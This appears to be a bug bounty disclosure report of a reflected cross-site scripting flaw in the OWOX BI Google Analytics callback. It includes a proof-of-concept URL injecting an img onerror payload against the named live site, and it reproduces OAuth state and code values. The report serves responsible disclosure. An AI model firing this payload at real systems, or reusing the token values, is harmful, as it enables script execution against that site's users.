Because it is completely independent\nDetail\nIn the process of selecting the data source at https://bi.owox.com/ui/settings/connected-services/setup/, I found a reflected XSS.\nSpecifically, when you click on Google Analytics, a page will appear for you to enter Gmail. After completing the steps, an error link will appear during the redirect (Screenshot)\n\u2588\u2588\u2588\nVulnerable area:\n/analytics/\nThe URL will now be: https://bi.owox.com/ui/callbacks/google-supervisors/analytics%3Cimg%20src=xss%20onerror=prompt(1)%3E/?state=d159b8264eef78b11afdd016531b128c&code=4/tAFEdKitWAD6NCxUfXRT4NMTLMnzMwHeDlac-un9ecDEce9Ts2EZ6_pN-giK_3uzKVeRS9rYuAnbihIaXRFfkvE&scope=email%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/analytics%20https://www.googleapis.com/auth/analytics.edit%20https://www.googleapis.com/auth/analytics.readonlyopenid&authuser=3&session_state=c7730a7cbcf834250345c43eaa83103ec536e3a4..3ebd&prompt=consent\nTested browser\nFirefox\nChrome\nPoC\nNote: I have shortened the URL to facilitate testing.\n1, go to https://bi.owox.com/ui/callbacks/google-supervisors/analytics%3Cimg%20src=xss%20onerror=prompt(1)%3E/?state=d159b8264eef78b11afdd016531b128c\n2, Log in and XSS will execute\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nThis vulnerability is aimed at all victims. Just paste this URL and login, XSS will automatically execute.\nTherefore, it will have a high impact, because before XSS is executed, the application will ask the user to login.\nThe attacker can execute JS code.\nDocuments related to Impact\nhttps://portswigger.net/web-security/cross-site-scripting/reflected\nhttps://portswigger.net/web-security/cross-site-scripting/exploiting\nBest regards,\n@dat\n\n",
